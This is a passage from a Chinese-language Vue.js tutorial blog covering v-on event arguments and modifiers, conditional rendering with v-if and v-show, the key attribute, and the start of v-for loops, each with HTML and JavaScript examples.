class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--1.事件调用的方法没有参数，带不带括号都可以--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn1Click()&quot;</span>&gt;</span>按钮1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn1Click&quot;</span>&gt;</span>按钮1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--2.在事件定义时，如果函数需要参数,但是没有传入, 那么函数的形参为undefined</span></span><br><span class="line"><span class="comment">    写方法时省略了小括号, 但是方法本身是需要一个参数的, 这时Vue会默认将浏览器生产的event事件对象作为参数传入到方法--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn2Click(123)&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn2Click()&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn2Click&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--3.方法定义时, 我们需要event对象, 同时又需要其他参数--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在调用方式, 如何手动的获取到浏览器参数的event对象: $event--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn3Click(abc, $event)&quot;</span>&gt;</span>按钮3<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">abc</span>: <span class="number">123</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btn1Click</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;btn1Click&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btn2Click</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--------&#x27;</span>, event);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btn3Click</span>(<span class="params">abc, event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;++++++++&#x27;</span>, abc, event);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>各个按钮依次点击效果如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201018232510.png"></p><h2 id="v-on的修饰符"><a href="#v-on的修饰符" class="headerlink" title="v-on的修饰符"></a>v-on的修饰符</h2><ul><li><code>.stop</code> - 调用 <code>event.stopPropagation()</code>。</li><li><code>.prevent</code> - 调用 <code>event.preventDefault()</code>。</li><li><code>.capture</code> - 添加事件侦听器时使用 capture 模式。</li><li><code>.self</code> - 只当事件是从侦听器绑定的元素本身触发时才触发回调。</li><li><code>.&#123;keyCode | keyAlias&#125;</code> - 只当事件是从特定键触发时才触发回调。</li><li><code>.native</code> - 监听组件根元素的原生事件。</li><li><code>.once</code> - 只触发一次回调。</li><li><code>.left</code> - (2.2.0) 只当点击鼠标左键时触发。</li><li><code>.right</code> - (2.2.0) 只当点击鼠标右键时触发。</li><li><code>.middle</code> - (2.2.0) 只当点击鼠标中键时触发。</li><li><code>.passive</code> - (2.3.0) 以 <code>&#123; passive: true &#125;</code> 模式添加侦听器</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--1. .stop修饰符的使用--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--停止冒泡行为，点击按钮时只调用btnClick--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> @<span class="attr">click</span>=<span class="string">&quot;divClick&quot;</span>&gt;</span></span><br><span class="line">        aaaaaaa</span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--2. .prevent修饰符的使用--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--阻止默认行为，手动提交form表单的数据--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;baidu&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;submitClick&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--3. .监听某个键盘的键帽--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--监听回车键的弹起--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;keyUp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--4. .once修饰符的使用--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--只触发一次回调--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;btn2Click&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;btnClick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">divClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;divClick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">submitClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;submitClick&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">keyUp</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;keyUp&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btn2Click</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;btn2Click&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h1><h2 id="v-if、v-else-if、v-else"><a href="#v-if、v-else-if、v-else" class="headerlink" title="v-if、v-else-if、v-else"></a>v-if、v-else-if、v-else</h2><p>这三个指令与JavaScript的条件语句if、else if、else类似。</p><p>Vue的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件。</p><p>v-if的原理：v-if后面的条件为false时，对应的元素以及其子元素不会渲染。也就是根本没有不会有对应的标签出现在DOM中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;score&gt;=90&quot;</span>&gt;</span>优秀<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score&gt;=80&quot;</span>&gt;</span>良好<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score&gt;=60&quot;</span>&gt;</span>及格<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-else</span>&gt;</span>不及格<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;result&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    const app = new Vue(&#123;</span><br><span class="line">        el: &quot;#app&#x27;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            score: 99</span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line">            result() &#123;</span><br><span class="line">                let showMessage = &#x27;&#x27;;</span><br><span class="line">                if (this.score &gt;= 90) &#123;</span><br><span class="line">                    showMessage = &#x27;优秀&#x27;</span><br><span class="line">                &#125; else if (this.score &gt;= 80) &#123;</span><br><span class="line">                    showMessage = &#x27;良好&#x27;</span><br><span class="line">                &#125; else if (this.score &gt;= 60) &#123;</span><br><span class="line">                    showMessage = &#x27;及格&#x27;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    showMessage = &#x27;不及格&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">                return showMessage</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="条件渲染案例"><a href="#条件渲染案例" class="headerlink" title="条件渲染案例"></a>条件渲染案例</h2><p>用户再登录时，可以切换使用用户账号登录还是邮箱地址登录。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;isUser&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户账号<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户账号&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>用户邮箱<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户邮箱&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isUser = !isUser&quot;</span>&gt;</span>切换类型<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isUser</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>for属性可以直接点击label标签，然后直接在对应id相同的文本框进行输入。</p><h2 id="案例小问题"><a href="#案例小问题" class="headerlink" title="案例小问题"></a>案例小问题</h2><p><strong>问题：</strong></p><p>如果我们在有输入内容的情况下，切换了类型，我们会发现文字依然显示之前的输入的内容。</p><p>但是按道理讲，我们应该切换到另外一个input元素中了。在另一个input元素中，我们并没有输入内容。</p><p><strong>问题解答：</strong></p><p>这是因为Vue在进行DOM渲染时，出于性能考虑，会尽可能的复用已经存在的元素，而不是重新创建新的元素。</p><p>在上面的案例中，Vue内部会发现原来的input元素不再使用，直接作为else中的input来使用了。</p><p><strong>解决方案：</strong></p><p>如果我们不希望Vue出现类似重复利用的问题，可以给对应的input添加key，并且我们需要保证key的不同。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;isUser&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户账号<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户账号&quot;</span> <span class="attr">key</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>用户邮箱<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户邮箱&quot;</span> <span class="attr">key</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isUser = !isUser&quot;</span>&gt;</span>切换类型<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h2><p>v-show的用法和v-if非常相似，也用于决定一个元素是否渲染。</p><p>v-if当条件为false时，压根不会有对应的元素在DOM中。</p><p>v-show当条件为false时，仅仅是将元素的display属性设置为none而已。</p><p>开发中如何选择呢？</p><ul><li><p>当需要在显示与隐藏之间切片很频繁时，使用v-show</p></li><li><p>当只有一次切换时，通常使用v-if</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--v-if: 当条件为false时, 包含v-if指令的元素, 根本就不会存在dom中--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span> <span class="attr">id</span>=<span class="string">&quot;aaa&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--v-show: 当条件为false时, v-show只是给我们的元素添加一个行内样式: display: none--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span> <span class="attr">id</span>=<span class="string">&quot;bbb&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="循环遍历"><a href="#循环遍历" class="headerlink" title="循环遍历"></a>循环遍历</h1><h2 id="v-for遍历数组"><a href="#v-for遍历数组" class="headerlink" title="v-for遍历数组"></a>v-for遍历数组</h2><p>当我们有一组数据需要进行渲染时，我们就可以使用v-for来完成。v-for的语法类似于JavaScript中的for循环。</p><p>格式为：item in items的形式。其中 <code>items</code> 是源数据数组，而 <code>item</code> 则是被迭代的数组元素的<strong>别名</strong>。</p><p>我们来看一个简单的案例：</p><ul><li>如果在遍历的过程中不需要使用索引值<br>语法格式：v-for&#x3D;”movie in movies”<br>依次从movies中取出movie，并且在元素的内容中，我们可以通过Mustache语法来使用movie</li><li>如果在遍历的过程中，我们需要拿到元素在数组中的索引值<br>语法格式：v-for&#x3D;(item, index) in items<br>其中的index就代表了取出的item在原数组的索引值。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--1.在遍历的过程中,没有使用索引值(下标值)--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in names&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--2.在遍历的过程中, 获取索引值--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in names&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;index+1&#125;&#125;.&#123;&#123;item&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">names</span>: [<span class="string">&#x27;jordan&#x27;</span>, <span class="string">&#x27;kobe&#x27;</span>, <span class="string">&#x27;james&#x27;</span>, <span class="string">&#x27;curry&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-for遍历对象"><a 